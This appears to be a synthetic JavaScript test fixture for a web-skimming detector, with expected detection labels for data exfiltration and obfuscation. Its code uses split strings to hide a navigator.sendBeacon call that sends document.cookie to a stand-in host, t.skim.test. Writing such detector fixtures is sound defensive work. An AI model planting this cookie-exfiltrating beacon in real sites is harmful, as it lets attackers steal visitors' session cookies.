// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: exfil.stored_data=medium obfuscation.packed=medium
var _0xa1b2 = navigator, _0xc3d4 = "send" + "Beacon", _0xe5f6 = document["coo" + "kie"];
_0xa1b2["send" + "Beacon"]("https://t.skim.test/p", _0xe5f6);
